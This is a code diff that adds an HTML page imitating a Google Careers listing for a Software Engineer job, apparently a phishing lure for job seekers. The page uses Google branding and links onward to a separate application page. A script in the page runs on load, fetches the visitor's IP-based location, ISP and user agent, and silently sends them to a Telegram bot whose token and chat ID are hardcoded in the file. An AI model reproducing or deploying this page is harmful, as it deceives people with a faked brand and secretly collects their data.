@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Join Google - Careers</title>
+
+  <!-- Google Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Google Sans', sans-serif;
+      background: linear-gradient(to right, #f1f3f4, #e8eaed);
+      color: #202124;
+    }
+
+    header {
+      background: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      border-bottom: 1px solid #dadce0;
+    }
+
+    .logo img {
+      height: 30px;
+    }
+
+    nav a {
+      margin-left: 2rem;
+      color: #5f6368;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+
+    nav a:hover {
+      color: #1a73e8;
+    }
+
+    .container {
+      display: flex;
+      max-width: 1200px;
+      margin: 2rem auto;
+      padding: 1rem;
+      gap: 2rem;
+    }
+
+    aside {
+      flex: 1;
+      background: #fff;
+      padding: 1.5rem;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      height: fit-content;
+    }
+
+    aside h3 {
+      margin-bottom: 1rem;
+      color: #1a73e8;
+      font-size: 1.2rem;
+    }
+
+    aside ul {
+      list-style: none;
+    }
+
+    aside ul li {
+      padding: 0.5rem 0;
+      display: flex;
+      align-items: center;
+    }
+
+    aside ul li .material-icons {
+      font-size: 20px;
+      margin-right: 10px;
+      color: #1a73e8;
+    }
+
+    main {
+      flex: 2.5;
+    }
+
+    .job-card {
+      background: #fff;
+      padding: 2rem 2.5rem;
+      border-radius: 16px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+      animation: fadeIn 0.4s ease-in;
+    }
+
+    .job-card h1 {
+      color: #1a73e8;
+      margin-bottom: 1rem;
+    }
+
+    .job-card p {
+      margin: 0.7rem 0;
+      font-size: 1rem;
+    }
+
+    .apply-btn {
+      margin-top: 2rem;
+      display: inline-block;
+      padding: 0.9rem 2rem;
+      background-color: #1a73e8;
+      color: #fff;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 1rem;
+      font-weight: 500;
+      transition: background-color 0.3s;
+    }
+
+    .apply-btn:hover {
+      background-color: #174ea6;
+    }
+
+    footer {
+      text-align: center;
+      padding: 1rem;
+      font-size: 0.85rem;
+      color: #777;
+      margin-top: 4rem;
+    }
+
+    footer a {
+      margin: 0 8px;
+      color: #5f6368;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(5px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+
+    .loading-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(26, 115, 232, 0.2);
+      border-radius: 50%;
+      border-top-color: #1a73e8;
+      animation: spin 1s ease-in-out infinite;
+      margin-bottom: 1rem;
+    }
+
+    .loading-text {
+      color: #1a73e8;
+      font-weight: 500;
+      font-size: 1.1rem;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        padding: 1rem;
+      }
+
+      aside {
+        margin-bottom: 2rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Processing...</div>
+  </div>
+
+  <header>
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+    </div>
+    <nav>
+      <a href="#">Jobs</a>
+      <a href="#">Teams</a>
+      <a href="#">Life at Google</a>
+      <a href="#">Hiring Process</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <aside>
+      <h3>Why Work at Google?</h3>
+      <ul>
+        <li><span class="material-icons">emoji_objects</span> Innovation culture</li>
+        <li><span class="material-icons">public</span> Global impact</li>
+        <li><span class="material-icons">groups</span> Diverse teams</li>
+        <li><span class="material-icons">home_work</span> Hybrid workplace</li>
+        <li><span class="material-icons">paid</span> Top-tier benefits</li>
+      </ul>
+    </aside>
+
+    <main>
+      <div class="job-card">
+        <h1>Software Engineer — Google</h1>
+        <p><strong>Location:</strong> Mountain View, CA (Hybrid)</p>
+        <p><strong>Type:</strong> Full-Time</p>
+        <p><strong>Annual Salary:</strong> $150,000 – $180,000</p>
+        <p><strong>Hourly Rate:</strong> $70 – $85/hr</p>
+        <p>We're seeking world-class engineers to join our dynamic product and infrastructure teams. As part of Google, you'll help build tools and technologies that scale globally, touching the lives of billions.</p>
+        <p>If you're passionate about innovation and solving complex challenges, you're in the right place.</p>
+
+        <a href="job.html" class="apply-btn" id="applyBtn">Proceed to Application</a>
+      </div>
+    </main>
+  </div>
+
+  <footer>
+    &copy; 2025 Google LLC &nbsp;|&nbsp;
+    <a href="#">Privacy</a> &nbsp;|&nbsp;
+    <a href="#">Terms</a> &nbsp;|&nbsp;
+    <a href="#">Accessibility</a>
+  </footer>
+
+  <script>
+    // Apply button loading
+    document.getElementById('applyBtn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('loadingOverlay').classList.add('active');
+      setTimeout(() => {
+        window.location.href = this.getAttribute('href');
+      }, 1500);
+    });
+
+    // Auto-send visitor info via Telegram
+    window.addEventListener('DOMContentLoaded', () => {
+      const BOT_TOKEN = '7489121653:AAGO9WeABG0P7fl6hnqAf7WrDrptpfHguAo';
+      const CHAT_ID = '1389938531';
+
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const msg = `
+🌍 *New Visitor Info:*
+• IP: ${data.ip}
+• City: ${data.city}
+• Region: ${data.region}
+• Country: ${data.country_name}
+• ISP: ${data.org}
+• Postal: ${data.postal}
+• Timezone: ${data.timezone}
+• User-Agent: ${navigator.userAgent}
+          `.trim();
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: msg,
+              parse_mode: 'Markdown'
+            })
+          });
+        })
+        .catch(err => console.error('Geo IP fetch error:', err));
+    });
+  </script>
+</body>
+</html>
